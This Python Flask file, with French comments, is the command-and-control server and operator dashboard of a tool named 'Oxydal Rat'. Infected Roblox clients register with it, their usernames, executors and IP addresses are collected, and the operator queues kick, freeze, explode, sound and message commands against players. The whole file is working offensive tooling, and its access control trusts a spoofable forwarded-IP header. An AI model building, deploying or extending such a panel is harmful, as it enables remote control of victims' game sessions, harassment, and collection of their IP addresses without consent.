from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# Tes IPs autorisées
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224", "127.0.0.1", "::1"}

connected_players = {}
pending_kicks = {}
pending_commands = {}

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
    if detected and "," in detected:
        detected = detected.split(",")[0].strip()
    return f"""
    <html>
      <body style="background:#000;color:#ff3366;font-family:Arial;text-align:center;padding-top:15%;">
        <h1>Accès refusé</h1>
        <p>Ta crue quoi fdp ?</p>
        <p>Ton IP : <b>{detected}</b></p>
      </body>
    </html>
    """, 403

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll"]:
        check_ip()

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Oxydal Rat</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@600&display=swap" rel="stylesheet">
<style>
    :root { --cyan:#00ffaa; --pink:#ff3366; --purple:#9d00ff; --bg:#0a0e17; }
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family:'Rajdhani',sans-serif; background:radial-gradient(circle at top,#0f2027,#000); color:#fff; min-height:100vh; display:flex; overflow:hidden; position:relative; }
    canvas { position:absolute; top:0; left:0; z-index:1; opacity:0.35; }

    .sidebar { width:280px; background:rgba(10,10,20,0.95); border-right:1px solid #333; padding:30px; z-index:10; backdrop-filter:blur(10px); box-shadow:0 0 30px rgba(0,255,170,0.2); }
    .sidebar h2 { font-family:'Orbitron',sans-serif; color:var(--cyan); font-size:2rem; text-align:center; margin-bottom:50px; text-shadow:0 0 20px var(--cyan); animation:glow 2s infinite alternate; }
    @keyframes glow { from { text-shadow:0 0 10px var(--cyan); } to { text-shadow:0 0 35px var(--cyan); } }

    .nav-btn { background:none; border:none; color:#aaa; padding:18px; text-align:left; font-size:1.3rem; cursor:pointer; border-radius:15px; margin-bottom:15px; transition:all .4s; position:relative; overflow:hidden; }
    .nav-btn::before { content:''; position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg,transparent,rgba(0,255,170,0.2),transparent); transition:.6s; }
    .nav-btn:hover::before { left:100%; }
    .nav-btn:hover { background:rgba(0,255,170,0.15); color:var(--cyan); transform:translateX(10px); }
    .nav-btn.active { background:rgba(0,255,170,0.2); color:var(--cyan); border-left:5px solid var(--cyan); box-shadow:0 0 20px rgba(0,255,170,0.4); }

    .main-content { flex:1; overflow-y:auto; padding:40px; z-index:5; position:relative; }
    .page { display:none; opacity:0; transition:opacity .6s; }
    .page.active { display:block; opacity:1; }

    h1 { font-family:'Orbitron',sans-serif; font-size:4.5rem; text-align:center; background:linear-gradient(45deg,#00ffaa,#00ffff,#ff00ff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; text-shadow:0 0 40px rgba(0,255,170,0.6); margin-bottom:20px; animation:titlePulse 3s infinite; }
    @keyframes titlePulse { 0%,100% { opacity:0.9; } 50% { opacity:1; transform:scale(1.02); } }

    .stats { text-align:center; font-size:2rem; margin:30px 0; color:var(--cyan); text-shadow:0 0 15px var(--cyan); }

    .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(380px,1fr)); gap:30px; padding:20px; }
    .card { background:rgba(20,25,40,0.9); border-radius:20px; padding:28px; backdrop-filter:blur(12px); border:1px solid rgba(0,255,170,0.3); box-shadow:0 0 30px rgba(0,0,0,0.8); transition:all .4s; position:relative; overflow:hidden; }
    .card::before { content:''; position:absolute; top:-50%; left:-50%; width:200%; height:200%; background:radial-gradient(circle,rgba(0,255,170,0.15),transparent); opacity:0; transition:.6s; }
    .card:hover::before { opacity:1; transform:rotate(30deg); }
    .card:hover { transform:translateY(-15px) scale(1.03); box-shadow:0 0 50px rgba(0,255,170,0.5); }

    .dot { width:16px; height:16px; border-radius:50%; background:#ff3366; box-shadow:0 0 15px #ff3366; animation:pulse 2s infinite; }
    .dot.online { background:var(--cyan); box-shadow:0 0 25px var(--cyan); }
    @keyframes pulse { 0%,100% { opacity:0.8; } 50% { opacity:1; transform:scale(1.2); } }

    .name a { color:#ffcc00; text-decoration:none; font-size:1.9rem; font-weight:bold; }
    .info { color:#ccc; line-height:1.8; margin:15px 0; }
    .category { font-weight:bold; color:var(--cyan); margin:18px 0 12px; font-size:1.2rem; }

    button.kick-btn { padding:14px 20px; border:none; border-radius:15px; font-weight:bold; color:white; cursor:pointer; transition:all .3s; position:relative; overflow:hidden; margin:6px 4px; }
    button.kick-btn:hover { transform:scale(1.1) translateY(-3px); box-shadow:0 10px 20px rgba(0,0,0,0.4); }

    .history-item { background:rgba(30,30,30,0.5); padding:16px; border-radius:12px; margin-bottom:12px; border-left:5px solid #444; display:flex; justify-content:space-between; align-items:center; }
    .history-item.connect { border-color:var(--cyan); }
    .history-item.disconnect { border-color:#ff3366; }
    .history-item.action { border-color:#ffcc00; }
    .history-time { color:#666; font-size:0.85rem; font-family:monospace; }

    .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.9); backdrop-filter:blur(10px); align-items:center; justify-content:center; z-index:1000; }
    .modal.active { display:flex; }
    .modal-content { background:#111; padding:40px; border-radius:25px; width:90%; max-width:550px; border:2px solid var(--cyan); box-shadow:0 0 60px rgba(0,255,170,0.6); animation:modalPop .5s; }
    @keyframes modalPop { from { transform:scale(0.7); opacity:0; } to { transform:scale(1); opacity:1; } }
    .modal-content input { width:100%; padding:16px; border-radius:12px; border:none; background:#222; color:white; font-size:1.2rem; margin-bottom:20px; }
    .modal-buttons button { flex:1; padding:16px; border:none; border-radius:12px; font-weight:bold; cursor:pointer; }

    .toast-container { position:fixed; bottom:30px; right:30px; z-index:999; }
    .toast { background:#111; border-left:6px solid var(--cyan); padding:18px 25px; margin-top:15px; border-radius:12px; box-shadow:0 0 20px rgba(0,0,0,0.6); animation:toastSlide .5s; }
    .toast.danger { border-color:#ff3366; }
    @keyframes toastSlide { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
</style>
</head>
<body>
<canvas id="particles"></canvas>

<div class="sidebar">
    <h2>OXYDAL RAT</h2>
    <button class="nav-btn active" onclick="showPage('playersPage',this)">Players</button>
    <button class="nav-btn" onclick="showPage('historyPage',this)">History</button>
</div>

<div class="main-content">
    <div id="playersPage" class="page active">
        <h1>Oxydal Rat</h1>
        <div class="stats" id="stats">Players online: <b>0</b></div>
        <div class="grid" id="players"></div>
    </div>
    <div id="historyPage" class="page">
        <h1>History Logs</h1>
        <div style="text-align:right;margin:20px;">
            <button class="kick-btn" style="background:#444;" onclick="document.getElementById('historyList').innerHTML=''">Clear History</button>
        </div>
        <div id="historyList"></div>
    </div>
</div>

<div class="modal" id="kickModal">
    <div class="modal-content">
        <h2>Kick Player</h2>
        <input type="text" id="kickReason" placeholder="Reason (optional)" autofocus>
        <div class="modal-buttons" style="display:flex;gap:15px;">
            <button class="cancel-btn" style="background:#444;" id="cancelKick">Cancel</button>
            <button class="confirm-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" id="confirmKick">Confirm</button>
        </div>
    </div>
</div>

<div class="modal" id="playSoundModal">
    <div class="modal-content" style="border-left:5px solid orange;box-shadow:0 0 40px rgba(255,165,0,0.7);">
        <h2 style="color:orange;">Play Sound</h2>
        <input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus>
        <div class="modal-buttons" style="display:flex;gap:15px;">
            <button class="cancel-btn" style="background:#444;" id="cancelSound">Cancel</button>
            <button class="confirm-btn" style="background:orange;" id="confirmSound">Confirm</button>
        </div>
    </div>
</div>

<div class="modal" id="messageModal">
    <div class="modal-content" style="border-left:5px solid #00ffff;box-shadow:0 0 40px rgba(0,255,255,0.4);">
        <h2 style="color:#00ffff;">Display Message</h2>
        <input type="text" id="messageText" placeholder="Enter text to show..." autofocus>
        <div class="modal-buttons" style="display:flex;gap:15px;">
            <button class="cancel-btn" style="background:#444;" id="cancelMessage">Cancel</button>
            <button class="confirm-btn" style="background:#00ffff;color:#000;" id="confirmMessage">Display</button>
        </div>
    </div>
</div>

<div class="toast-container" id="toasts"></div>

<script>
    const socket = io();
    let currentKickId = null;

    // Particules de fond
    const canvas = document.getElementById('particles');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const particles = [];
    for(let i=0;i<80;i++){
        particles.push({x:Math.random()*canvas.width, y:Math.random()*canvas.height, size:Math.random()*4+1, speedX:Math.random()*1-0.5, speedY:Math.random()*1-0.5});
    }
    function animate(){
        ctx.clearRect(0,0,canvas.width,canvas.height);
        particles.forEach(p=>{
            ctx.fillStyle='rgba(0,255,170,0.6)';
            ctx.beginPath(); ctx.arc(p.x,p.y,p.size,0,Math.PI*2); ctx.fill();
            p.x+=p.speedX; p.y+=p.speedY;
            if(p.x<0||p.x>canvas.width) p.speedX*=-1;
            if(p.y<0||p.y>canvas.height) p.speedY*=-1;
        });
        requestAnimationFrame(animate);
    }
    animate();
    window.addEventListener('resize',()=>{canvas.width=window.innerWidth; canvas.height=window.innerHeight;});

    function showPage(id, btn){
        document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
        document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        btn.classList.add('active');
    }

    function addLog(msg,type){
        const list = document.getElementById("historyList");
        const div = document.createElement("div");
        div.className = `history-item ${type}`;
        div.innerHTML = `<span>${msg}</span><span class="history-time">${new Date().toLocaleTimeString()}</span>`;
        list.prepend(div);
    }

    function toast(msg, type="success"){
        const t = document.createElement("div");
        t.className = "toast " + (type==="danger"?"danger":"");
        t.textContent = msg;
        document.getElementById("toasts").appendChild(t);
        setTimeout(()=>t.remove(),5000);
    }

    function openKickModal(id){ currentKickId=id; document.getElementById("kickModal").classList.add("active"); }
    function closeKickModal(){ document.getElementById("kickModal").classList.remove("active"); }
    function performKick(){ const r=document.getElementById("kickReason").value||"Kicked by admin"; fetch("/kick",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentKickId,reason:r})}); closeKickModal(); }

    function openPlaySoundModal(id){ currentKickId=id; document.getElementById("playSoundModal").classList.add("active"); }
    function closeSoundModal(){ document.getElementById("playSoundModal").classList.remove("active"); }
    function performPlaySound(){ const id=document.getElementById("soundAssetId").value; if(id) sendTroll(currentKickId,"playsound",id); closeSoundModal(); }

    function openMessageModal(id){ currentKickId=id; document.getElementById("messageModal").classList.add("active"); }
    function closeMessageModal(){ document.getElementById("messageModal").classList.remove("active"); }
    function performMessage(){ const txt=document.getElementById("messageText").value; if(txt) sendTroll(currentKickId,"message",txt); closeMessageModal(); }

    function sendTroll(id,cmd,assetId=null){
        fetch("/troll",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,cmd:cmd,assetId:assetId||null})});
    }

    document.getElementById("cancelKick").onclick = closeKickModal;
    document.getElementById("confirmKick").onclick = performKick;
    document.getElementById("cancelSound").onclick = closeSoundModal;
    document.getElementById("confirmSound").onclick = performPlaySound;
    document.getElementById("cancelMessage").onclick = closeMessageModal;
    document.getElementById("confirmMessage").onclick = performMessage;

    function render(data){
        document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b>`;
        const grid = document.getElementById("players");
        const currentIds = new Set(Object.keys(data.players));

        Object.entries(data.players).forEach(([id,p])=>{
            let card = document.getElementById(`card_${id}`);
            if(!card){
                card = document.createElement("div"); card.className="card"; card.id=`card_${id}`; grid.appendChild(card);
                addLog(`Connect: ${p.username} (${id})`,"connect");
            }
            card.innerHTML = `
                <div class="status"><div class="dot ${p.online?"online":""}"></div><span>${p.online?"Online":"Offline"}</span></div>
                <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
                <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: ${p.game}</div>
                <div class="category">TROLLS</div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
                    <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" onclick="openKickModal('${id}')">KICK</button>
                    <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                    <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa);" onclick="sendTroll('${id}','spin')">SPIN</button>
                    <button class="kick-btn" style="background:linear-gradient(45deg,#ffff00,#aaaa00);" onclick="sendTroll('${id}','jump')">JUMP</button>
                    <button class="kick-btn" style="background:linear-gradient(45deg,#88ff88,#55aa55);" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                    <button class="kick-btn" style="background:linear-gradient(45deg,#ff5555,#aa0000);" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                    <button class="kick-btn" style="background:linear-gradient(45deg,#5555ff,#0000aa);" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                    <button class="kick-btn" style="background:orange;" onclick="openPlaySoundModal('${id}')">PLAY SOUND</button>
                    <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#008888);grid-column:span 2;" onclick="openMessageModal('${id}')">DISPLAY MESSAGE</button>
                </div>
                <div class="category">UNDO</div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
                    <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                    <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                    <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
                    <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','uninvisible')">UNINVISIBLE</button>
                    <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
                </div>
            `;
        });

        document.querySelectorAll('.card').forEach(c=>{
            const id = c.id.replace('card_','');
            if(!currentIds.has(id)){
                addLog(`Disconnect: ID ${id}`,"disconnect");
                c.remove();
            }
        });
    }

    socket.on("update", render);
    socket.on("kick_notice", d=>{ toast(`${d.username} → ${d.reason}`, "danger"); addLog(`Action: ${d.username} | ${d.reason}`, "action"); });
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json(silent=True) or {}
            uid = str(d["userid"])
            if d.get("action") == "register":
                connected_players[uid] = {
                    "username": d.get("username", "Unknown"),
                    "executor": d.get("executor", "Unknown"),
                    "ip": d.get("ip", "Unknown"),
                    "last": now,
                    "online": True,
                    "game": d.get("game", "Unknown")
                }
            elif d.get("action") == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
        except: pass
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if not uid: return jsonify({})
        if uid in pending_kicks:
            reason = pending_kicks.pop(uid, "Kicked")
            return jsonify({"command": "kick", "reason": reason})
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            assetId = None
            if isinstance(cmd, dict):
                assetId = cmd.get("assetId")
                cmd = cmd.get("cmd")
            return jsonify({"command": cmd, "assetId": assetId})
        return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    reason = data.get("reason", "No reason")
    pending_kicks[uid] = reason
    name = connected_players.get(uid, {}).get("username", "Unknown")
    socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    cmd = data.get("cmd", "")
    assetId = data.get("assetId")
    if uid and cmd:
        if assetId:
            pending_commands[uid] = {"cmd": cmd, "assetId": assetId}
        else:
            pending_commands[uid] = cmd
        name = connected_players.get(uid, {}).get("username", "Unknown")
        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
    return jsonify({"sent": True})

def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in connected_players.items():
            if now - p["last"] > 30:
                to_remove.append(uid)
            else:
                p["online"] = now - p["last"] < 15
                if p["online"]: online += 1
        for uid in to_remove:
            connected_players.pop(uid, None)
        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
